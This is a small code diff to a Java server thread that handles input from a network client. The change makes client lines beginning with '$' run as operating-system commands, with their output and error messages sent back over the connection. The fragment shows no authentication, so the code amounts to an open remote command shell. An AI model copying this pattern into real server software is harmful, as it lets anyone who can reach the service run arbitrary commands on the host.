@@ -89,8 +89,10 @@ public class ServerThread extends BaseServiceImpl implements Runnable{
                 }else if(str.startsWith("$")){
                     try{
                         InputStream inputStream = Runtime.getRuntime().exec(str.substring(1)).getInputStream();
+                        //
+                        copy(inputStream,out);
                     }catch (Exception e){
-
+                        out.println(e.getMessage());
                     }
                 }
             }
